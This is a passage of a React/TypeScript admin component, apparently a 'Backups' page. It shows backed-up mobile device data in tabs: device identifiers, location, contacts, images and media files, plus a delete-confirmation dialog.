                                <>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">iOS Version</Text>
                                    <Text>{selectedBackup.device_info.systemVersion || 'N/A'}</Text>
                                  </Box>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Identifier for Vendor</Text>
                                    <Text fontSize="xs" fontFamily="monospace">
                                      {selectedBackup.device_info.identifierForVendor || 'N/A'}
                                    </Text>
                                  </Box>
                                  {selectedBackup.device_info.sysname && (
                                    <>
                                      <Box>
                                        <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">System Name</Text>
                                        <Text>{selectedBackup.device_info.sysname}</Text>
                                      </Box>
                                      <Box>
                                        <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Node Name</Text>
                                        <Text>{selectedBackup.device_info.nodename || 'N/A'}</Text>
                                      </Box>
                                      <Box>
                                        <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Release</Text>
                                        <Text>{selectedBackup.device_info.release || 'N/A'}</Text>
                                      </Box>
                                      <Box>
                                        <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Machine</Text>
                                        <Text>{selectedBackup.device_info.machine || 'N/A'}</Text>
                                      </Box>
                                    </>
                                  )}
                                </>
                              )}
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Display</Text>
                                <Text fontSize="xs" fontFamily="monospace">
                                  {selectedBackup.device_info.display || 'N/A'}
                                </Text>
                              </Box>
                            </SimpleGrid>
                          </Box>
                        )}

                        {/* Hardware Information Section */}
                        {selectedBackup.device_info.platform === 'Android' && (
                          <Box>
                            <Text fontWeight="bold" fontSize="md" mb="3" color="brand.600">
                              ⚙️ Hardware Information
                            </Text>
                            <SimpleGrid columns={2} spacing="4" p="4" bg="gray.50" borderRadius="md">
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Hardware</Text>
                                <Text>{selectedBackup.device_info.hardware || 'N/A'}</Text>
                              </Box>
                              {selectedBackup.device_info.supportedAbis && (
                                <Box gridColumn="span 2">
                                  <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Supported ABIs</Text>
                                  <HStack flexWrap="wrap" gap="2">
                                    {selectedBackup.device_info.supportedAbis.map((abi, idx) => (
                                      <Badge key={idx} colorScheme="blue">{abi}</Badge>
                                    ))}
                                  </HStack>
                                </Box>
                              )}
                              {selectedBackup.device_info.supported32BitAbis && selectedBackup.device_info.supported32BitAbis.length > 0 && (
                                <Box>
                                  <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">32-bit ABIs</Text>
                                  <HStack flexWrap="wrap" gap="2">
                                    {selectedBackup.device_info.supported32BitAbis.map((abi, idx) => (
                                      <Badge key={idx} colorScheme="cyan" size="sm">{abi}</Badge>
                                    ))}
                                  </HStack>
                                </Box>
                              )}
                              {selectedBackup.device_info.supported64BitAbis && selectedBackup.device_info.supported64BitAbis.length > 0 && (
                                <Box>
                                  <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">64-bit ABIs</Text>
                                  <HStack flexWrap="wrap" gap="2">
                                    {selectedBackup.device_info.supported64BitAbis.map((abi, idx) => (
                                      <Badge key={idx} colorScheme="purple" size="sm">{abi}</Badge>
                                    ))}
                                  </HStack>
                                </Box>
                              )}
                            </SimpleGrid>
                          </Box>
                        )}

                        {/* System Information Section */}
                        {selectedBackup.device_info.platform === 'Android' && (
                          <Box>
                            <Text fontWeight="bold" fontSize="md" mb="3" color="brand.600">
                              🖥️ System Information
                            </Text>
                            <SimpleGrid columns={2} spacing="4" p="4" bg="gray.50" borderRadius="md">
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Android ID</Text>
                                <Text fontSize="xs" fontFamily="monospace">
                                  {selectedBackup.device_info.androidId || 'N/A'}
                                </Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Bootloader</Text>
                                <Text>{selectedBackup.device_info.bootloader || 'N/A'}</Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Board</Text>
                                <Text>{selectedBackup.device_info.board || 'N/A'}</Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Host</Text>
                                <Text fontSize="sm">{selectedBackup.device_info.host || 'N/A'}</Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Tags</Text>
                                <Text fontSize="sm">{selectedBackup.device_info.tags || 'N/A'}</Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Type</Text>
                                <Text>{selectedBackup.device_info.type || 'N/A'}</Text>
                              </Box>
                              <Box gridColumn="span 2">
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Fingerprint</Text>
                                <Text fontSize="xs" fontFamily="monospace" wordBreak="break-all">
                                  {selectedBackup.device_info.fingerprint || 'N/A'}
                                </Text>
                              </Box>
                              {selectedBackup.device_info.systemFeatures && selectedBackup.device_info.systemFeatures.length > 0 && (
                                <Box gridColumn="span 2">
                                  <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="2">System Features</Text>
                                  <Box maxH="200px" overflowY="auto" p="2" bg="white" borderRadius="md" border="1px" borderColor="gray.200">
                                    <VStack align="stretch" spacing="1">
                                      {selectedBackup.device_info.systemFeatures.slice(0, 20).map((feature, idx) => (
                                        <Text key={idx} fontSize="xs" fontFamily="monospace" color="gray.700">
                                          • {feature}
                                        </Text>
                                      ))}
                                      {selectedBackup.device_info.systemFeatures.length > 20 && (
                                        <Text fontSize="xs" color="gray.500" fontStyle="italic">
                                          ... and {selectedBackup.device_info.systemFeatures.length - 20} more
                                        </Text>
                                      )}
                                    </VStack>
                                  </Box>
                                </Box>
                              )}
                            </SimpleGrid>
                          </Box>
                        )}

                        {/* Storage Information Section */}
                        {(selectedBackup.device_info.totalDiskSpaceGB || selectedBackup.device_info.freeDiskSpaceGB) && (
                          <Box>
                            <Text fontWeight="bold" fontSize="md" mb="3" color="brand.600">
                              💾 Storage Information
                            </Text>
                            <SimpleGrid columns={3} spacing="4" p="4" bg="gray.50" borderRadius="md">
                              <Box textAlign="center">
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Total Space</Text>
                                <Text fontSize="2xl" fontWeight="bold" color="blue.500">
                                  {selectedBackup.device_info.totalDiskSpaceGB || 'N/A'}
                                </Text>
                                <Text fontSize="xs" color="gray.500">GB</Text>
                              </Box>
                              <Box textAlign="center">
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Free Space</Text>
                                <Text fontSize="2xl" fontWeight="bold" color="green.500">
                                  {selectedBackup.device_info.freeDiskSpaceGB || 'N/A'}
                                </Text>
                                <Text fontSize="xs" color="gray.500">GB</Text>
                              </Box>
                              <Box textAlign="center">
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Used Space</Text>
                                <Text fontSize="2xl" fontWeight="bold" color="orange.500">
                                  {selectedBackup.device_info.usedDiskSpaceGB || 'N/A'}
                                </Text>
                                <Text fontSize="xs" color="gray.500">GB</Text>
                              </Box>
                            </SimpleGrid>
                          </Box>
                        )}

                        {/* App Information Section */}
                        {(selectedBackup.device_info.appName || selectedBackup.device_info.packageName) && (
                          <Box>
                            <Text fontWeight="bold" fontSize="md" mb="3" color="brand.600">
                              📲 App Information
                            </Text>
                            <SimpleGrid columns={2} spacing="4" p="4" bg="gray.50" borderRadius="md">
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">App Name</Text>
                                <Text>{selectedBackup.device_info.appName || 'N/A'}</Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Package Name</Text>
                                <Text fontSize="sm" fontFamily="monospace">
                                  {selectedBackup.device_info.packageName || 'N/A'}
                                </Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">App Version</Text>
                                <Badge colorScheme="green">{selectedBackup.device_info.appVersion || 'N/A'}</Badge>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Build Number</Text>
                                <Badge>{selectedBackup.device_info.buildNumber || 'N/A'}</Badge>
                              </Box>
                              {selectedBackup.device_info.buildSignature && (
                                <Box gridColumn="span 2">
                                  <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Build Signature</Text>
                                  <Text fontSize="xs" fontFamily="monospace" wordBreak="break-all">
                                    {selectedBackup.device_info.buildSignature}
                                  </Text>
                                </Box>
                              )}
                            </SimpleGrid>
                          </Box>
                        )}

                        {/* System Context Section */}
                        {(selectedBackup.device_info.timezone || selectedBackup.device_info.locale) && (
                          <Box>
                            <Text fontWeight="bold" fontSize="md" mb="3" color="brand.600">
                              🌍 System Context
                            </Text>
                            <SimpleGrid columns={2} spacing="4" p="4" bg="gray.50" borderRadius="md">
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Timezone</Text>
                                <Text>{selectedBackup.device_info.timezone || 'N/A'}</Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Timezone Offset</Text>
                                <Text>
                                  {selectedBackup.device_info.timezoneOffset !== undefined
                                    ? `UTC ${selectedBackup.device_info.timezoneOffset >= 0 ? '+' : ''}${selectedBackup.device_info.timezoneOffset}`
                                    : 'N/A'}
                                </Text>
                              </Box>
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Locale</Text>
                                <Text>{selectedBackup.device_info.locale || 'N/A'}</Text>
                              </Box>
                              {selectedBackup.device_info.backup_timestamp && (
                                <Box>
                                  <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Backup Timestamp</Text>
                                  <Text fontSize="sm">
                                    {new Date(selectedBackup.device_info.backup_timestamp).toLocaleString()}
                                  </Text>
                                </Box>
                              )}
                            </SimpleGrid>
                          </Box>
                        )}

                        {/* Last Updated Footer */}
                        {selectedBackup.device_info_updated_at && (
                          <Box pt="4" borderTop="1px" borderColor="gray.200">
                            <Text fontSize="sm" color="gray.500" textAlign="center">
                              Last updated: {formatDate(selectedBackup.device_info_updated_at)}
                            </Text>
                          </Box>
                        )}
                      </VStack>
                    ) : (
                      <Center p="8">
                        <VStack spacing="3">
                          <Text fontSize="4xl">📱</Text>
                          <Text color="gray.500" fontSize="lg">No device info available</Text>
                          <Text color="gray.400" fontSize="sm">Device information will appear here once backup is completed</Text>
                        </VStack>
                      </Center>
                    )}
                  </TabPanel>

                  {/* Location Tab */}
                  <TabPanel>
                    {selectedBackup.location ? (
                      <VStack spacing="3" align="stretch">
                        <Box>
                          <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">
                            Address
                          </Text>
                          <Text>{selectedBackup.location.address || 'N/A'}</Text>
                        </Box>
                        <SimpleGrid columns={2} spacing="4">
                          <Box>
                            <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">
                              Latitude
                            </Text>
                            <Text>{selectedBackup.location.latitude}</Text>
                          </Box>
                          <Box>
                            <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">
                              Longitude
                            </Text>
                            <Text>{selectedBackup.location.longitude}</Text>
                          </Box>
                          <Box>
                            <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">
                              Accuracy
                            </Text>
                            <Text>{selectedBackup.location.accuracy}m</Text>
                          </Box>
                          <Box>
                            <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">
                              Altitude
                            </Text>
                            <Text>{selectedBackup.location.altitude}m</Text>
                          </Box>
                        </SimpleGrid>
                        {selectedBackup.location_updated_at && (
                          <Text fontSize="sm" color="gray.500">
                            Last updated: {formatDate(selectedBackup.location_updated_at)}
                          </Text>
                        )}
                      </VStack>
                    ) : (
                      <Text color="gray.500">No location data available</Text>
                    )}
                  </TabPanel>

                  {/* Contacts Tab */}
                  <TabPanel>
                    <VStack align="stretch" spacing="4">
                      <HStack justify="space-between">
                        <Text fontWeight="bold">
                          {selectedBackup.contacts_count || 0} contacts backed up
                        </Text>
                        {selectedBackup.contacts_updated_at && (
                          <Text fontSize="sm" color="gray.500">
                            Last updated: {formatDate(selectedBackup.contacts_updated_at)}
                          </Text>
                        )}
                      </HStack>

                      {selectedBackup.contacts && selectedBackup.contacts.length > 0 ? (
                        <Box maxH="400px" overflowY="auto" borderWidth="1px" borderRadius="md">
                          <Table size="sm" variant="simple">
                            <Thead position="sticky" top="0" bg="white" zIndex="1">
                              <Tr>
                                <Th>Name</Th>
                                <Th>Phone Numbers</Th>
                                <Th>Emails</Th>
                              </Tr>
                            </Thead>
                            <Tbody>
                              {selectedBackup.contacts.map((contact: any, index: number) => (
                                <Tr key={index}>
                                  <Td>
                                    <VStack align="start" spacing="0">
                                      <Text fontWeight="medium">{contact.displayName || 'Unknown'}</Text>
                                      {(contact.firstName || contact.lastName) && (
                                        <Text fontSize="xs" color="gray.500">
                                          {contact.firstName} {contact.lastName}
                                        </Text>
                                      )}
                                    </VStack>
                                  </Td>
                                  <Td>
                                    {contact.phones && contact.phones.length > 0 ? (
                                      <VStack align="start" spacing="1">
                                        {contact.phones.map((phone: any, pIdx: number) => (
                                          <HStack key={pIdx} spacing="2">
                                            <Badge size="sm" colorScheme="blue" fontSize="xs">
                                              {phone.label || 'mobile'}
                                            </Badge>
                                            <Text fontSize="sm">{phone.number}</Text>
                                          </HStack>
                                        ))}
                                      </VStack>
                                    ) : (
                                      <Text fontSize="sm" color="gray.400">No phone</Text>
                                    )}
                                  </Td>
                                  <Td>
                                    {contact.emails && contact.emails.length > 0 ? (
                                      <VStack align="start" spacing="1">
                                        {contact.emails.map((email: any, eIdx: number) => (
                                          <HStack key={eIdx} spacing="2">
                                            <Badge size="sm" colorScheme="green" fontSize="xs">
                                              {email.label || 'email'}
                                            </Badge>
                                            <Text fontSize="sm">{email.address}</Text>
                                          </HStack>
                                        ))}
                                      </VStack>
                                    ) : (
                                      <Text fontSize="sm" color="gray.400">No email</Text>
                                    )}
                                  </Td>
                                </Tr>
                              ))}
                            </Tbody>
                          </Table>
                        </Box>
                      ) : (
                        <Center p="8" borderWidth="1px" borderRadius="md" borderStyle="dashed">
                          <Text color="gray.500">No contacts available</Text>
                        </Center>
                      )}
                    </VStack>
                  </TabPanel>

                  {/* Images Tab */}
                  <TabPanel>
                    <VStack align="stretch" spacing="4">
                      <HStack justify="space-between" flexWrap="wrap" gap="2">
                        <HStack spacing="3">
                          <Icon as={FiImage} boxSize="5" color="green.500" />
                          <Text fontWeight="bold" fontSize="lg">
                            {selectedBackup.images_count || 0} images backed up
                          </Text>
                        </HStack>
                        {selectedBackup.images_updated_at && (
                          <HStack spacing="2">
                            <Icon as={FiClock} boxSize="4" color="gray.500" />
                            <Text fontSize="sm" color="gray.500">
                              Last updated: {formatDate(selectedBackup.images_updated_at)}
                            </Text>
                          </HStack>
                        )}
                      </HStack>

                      {selectedBackup.images && selectedBackup.images.length > 0 ? (
                        <Box
                          maxH="500px"
                          overflowY="auto"
                          p="2"
                          bg="gray.50"
                          borderRadius="lg"
                          sx={{
                            '&::-webkit-scrollbar': {
                              width: '8px',
                            },
                            '&::-webkit-scrollbar-track': {
                              background: '#f1f1f1',
                              borderRadius: '10px',
                            },
                            '&::-webkit-scrollbar-thumb': {
                              background: '#888',
                              borderRadius: '10px',
                            },
                            '&::-webkit-scrollbar-thumb:hover': {
                              background: '#555',
                            },
                          }}
                        >
                          <SimpleGrid columns={{ base: 2, md: 3, lg: 4 }} spacing="4">
                            {selectedBackup.images.map((image: any, index: number) => (
                              <Box
                                key={index}
                                position="relative"
                                bg="white"
                                borderRadius="lg"
                                overflow="hidden"
                                border="1px"
                                borderColor="gray.200"
                                transition="all 0.3s"
                                _hover={{
                                  transform: 'translateY(-4px)',
                                  shadow: 'xl',
                                  borderColor: 'purple.400',
                                }}
                              >
                                {/* Image Container */}
                                <Box
                                  position="relative"
                                  w="100%"
                                  h="200px"
                                  bg="gray.100"
                                  overflow="hidden"
                                >
                                  {image.url ? (
                                    <img
                                      src={image.url}
                                      alt={`Image ${index + 1}`}
                                      style={{
                                        width: '100%',
                                        height: '100%',
                                        objectFit: 'cover',
                                        display: 'block',
                                      }}
                                      loading="lazy"
                                    />
                                  ) : (
                                    <Center h="100%">
                                      <VStack spacing="2">
                                        <Icon as={FiAlertCircle} boxSize="8" color="gray.400" />
                                        <Text fontSize="sm" color="gray.500">
                                          No preview
                                        </Text>
                                      </VStack>
                                    </Center>
                                  )}
                                </Box>

                                {/* Image Info */}
                                <VStack align="stretch" spacing="2" p="3" bg="white">
                                  <HStack justify="space-between" fontSize="xs">
                                    <HStack spacing="1" color="gray.600">
                                      <Icon as={FiImage} />
                                      <Text fontWeight="medium">
                                        {image.width || 'N/A'} × {image.height || 'N/A'}
                                      </Text>
                                    </HStack>
                                    {image.size && (
                                      <Badge colorScheme="green" fontSize="xs">
                                        {(image.size / 1024 / 1024).toFixed(1)} MB
                                      </Badge>
                                    )}
                                  </HStack>

                                  {image.createDate && (
                                    <Text fontSize="xs" color="gray.500" noOfLines={1}>
                                      {new Date(image.createDate).toLocaleDateString('en-US', {
                                        month: 'short',
                                        day: 'numeric',
                                        year: 'numeric',
                                      })}
                                    </Text>
                                  )}

                                  {/* Action Buttons */}
                                  {image.url && (
                                    <HStack spacing="2" pt="1">
                                      <Button
                                        size="xs"
                                        leftIcon={<FiEye />}
                                        colorScheme="purple"
                                        variant="solid"
                                        onClick={() => window.open(image.url, '_blank')}
                                        flex="1"
                                      >
                                        View
                                      </Button>
                                      <IconButton
                                        size="xs"
                                        icon={<Icon as={FiImage} />}
                                        colorScheme="green"
                                        variant="outline"
                                        onClick={() => {
                                          const link = document.createElement('a');
                                          link.href = image.url;
                                          link.download = `image-${index + 1}.jpg`;
                                          link.target = '_blank';
                                          link.click();
                                        }}
                                        aria-label="Download image"
                                      />
                                    </HStack>
                                  )}
                                </VStack>
                              </Box>
                            ))}
                          </SimpleGrid>
                        </Box>
                      ) : (
                        <Center p="12" borderWidth="1px" borderRadius="md" borderStyle="dashed" bg="gray.50">
                          <VStack spacing="3">
                            <Icon as={FiImage} boxSize="16" color="gray.300" />
                            <Text color="gray.500" fontSize="lg" fontWeight="medium">
                              No images available
                            </Text>
                            <Text color="gray.400" fontSize="sm" textAlign="center" maxW="sm">
                              Images backed up from the mobile app will appear here
                            </Text>
                          </VStack>
                        </Center>
                      )}
                    </VStack>
                  </TabPanel>

                  {/* Files Tab */}
                  <TabPanel>
                    <VStack align="stretch" spacing="4">
                      <HStack justify="space-between">
                        <Text fontWeight="bold">
                          {selectedBackup.files_count || 0} files backed up
                        </Text>
                        {selectedBackup.files_updated_at && (
                          <Text fontSize="sm" color="gray.500">
                            Last updated: {formatDate(selectedBackup.files_updated_at)}
                          </Text>
                        )}
                      </HStack>

                      {selectedBackup.files && selectedBackup.files.length > 0 ? (
                        <Box maxH="400px" overflowY="auto" borderWidth="1px" borderRadius="md">
                          <Table size="sm" variant="simple">
                            <Thead position="sticky" top="0" bg="white" zIndex="1">
                              <Tr>
                                <Th>File</Th>
                                <Th>Type</Th>
                                <Th>Size</Th>
                                <Th>Duration</Th>
                                <Th>Date</Th>
                                <Th>Actions</Th>
                              </Tr>
                            </Thead>
                            <Tbody>
                              {selectedBackup.files.map((file: any, index: number) => (
                                <Tr key={index}>
                                  <Td>
                                    <Text fontSize="sm" fontWeight="medium">
                                      File {index + 1}
                                    </Text>
                                    <Text fontSize="xs" color="gray.500" noOfLines={1}>
                                      {file.mimeType || 'Unknown type'}
                                    </Text>
                                  </Td>
                                  <Td>
                                    <Badge colorScheme={
                                      file.type?.includes('video') ? 'purple' :
                                      file.type?.includes('audio') ? 'orange' : 'gray'
                                    }>
                                      {file.type?.replace('AssetType.', '') || 'Unknown'}
                                    </Badge>
                                  </Td>
                                  <Td>
                                    <Text fontSize="sm">
                                      {file.size
                                        ? `${(file.size / 1024 / 1024).toFixed(2)} MB`
                                        : 'N/A'}
                                    </Text>
                                  </Td>
                                  <Td>
                                    <Text fontSize="sm">
                                      {file.duration
                                        ? `${Math.floor(file.duration / 60)}:${String(file.duration % 60).padStart(2, '0')}`
                                        : 'N/A'}
                                    </Text>
                                  </Td>
                                  <Td>
                                    <Text fontSize="sm">
                                      {file.createDate
                                        ? new Date(file.createDate).toLocaleDateString()
                                        : 'N/A'}
                                    </Text>
                                  </Td>
                                  <Td>
                                    {file.url && (
                                      <Button
                                        size="xs"
                                        colorScheme="brand"
                                        onClick={() => window.open(file.url, '_blank')}
                                      >
                                        View
                                      </Button>
                                    )}
                                  </Td>
                                </Tr>
                              ))}
                            </Tbody>
                          </Table>
                        </Box>
                      ) : (
                        <Center p="8" borderWidth="1px" borderRadius="md" borderStyle="dashed">
                          <Text color="gray.500">No files available</Text>
                        </Center>
                      )}
                    </VStack>
                  </TabPanel>
                </TabPanels>
              </Tabs>
            )}
          </ModalBody>
          <ModalFooter>
            <Button onClick={onClose}>Close</Button>
          </ModalFooter>
        </ModalContent>
      </Modal>

      {/* Delete Confirmation Dialog */}
      <AlertDialog
        isOpen={isDeleteOpen}
        leastDestructiveRef={cancelRef}
        onClose={() => setIsDeleteOpen(false)}
      >
        <AlertDialogOverlay>
          <AlertDialogContent>
            <AlertDialogHeader fontSize="lg" fontWeight="bold">
              Delete Backup
            </AlertDialogHeader>

            <AlertDialogBody>
              Are you sure you want to delete this backup? This action cannot be undone.
            </AlertDialogBody>

            <AlertDialogFooter>
              <Button ref={cancelRef} onClick={() => setIsDeleteOpen(false)}>
                Cancel
              </Button>
              <Button colorScheme="red" onClick={handleDeleteBackup} ml={3}>
                Delete
              </Button>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialogOverlay>
      </AlertDialog>
    </Box>
  );
};

export default Backups;
